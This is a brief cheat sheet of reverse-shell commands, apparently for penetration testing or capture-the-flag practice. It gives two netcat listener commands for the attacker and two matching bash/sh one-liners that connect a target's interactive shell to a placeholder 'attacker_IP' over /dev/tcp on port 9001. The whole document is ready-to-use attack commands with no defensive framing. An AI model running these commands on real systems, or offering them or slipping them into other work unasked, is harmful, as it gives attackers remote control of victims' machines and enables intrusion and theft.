
# Reverse Shells
### Example 1
#### Listener (attacker)
nc -lp 9001
#### Target
bash -i >& /dev/tcp/attacker_IP/9001 0>&1

### Example 2
#### Listener (attacker)
nc -lvnp 9001
#### Target
sh -i 5<> /dev/tcp/attacker_IP/9001 0<&5 1>&5 2>&5
